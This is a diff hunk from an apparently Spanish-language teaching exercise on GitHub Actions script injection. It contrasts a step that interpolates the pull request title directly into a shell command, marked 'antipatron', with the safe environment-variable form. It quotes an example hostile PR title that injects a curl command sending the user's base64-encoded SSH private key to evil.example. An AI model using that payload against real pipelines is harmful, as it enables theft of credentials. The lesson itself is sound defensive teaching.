@@ -21,7 +21,7 @@ normal. ¿Cuál es peligroso, por qué, y qué pasa si alguien abre un PR titula
 `x"; curl https://evil.example/$(cat ~/.ssh/id_rsa | base64) #`?
 
 ```yaml
-- run: echo "Título: ${{ github.event.pull_request.title }}"
+- run: echo "Título: ${{ github.event.pull_request.title }}"   # antipatron
 - env:
     TITLE: ${{ github.event.pull_request.title }}
   run: echo "Título: $TITLE"
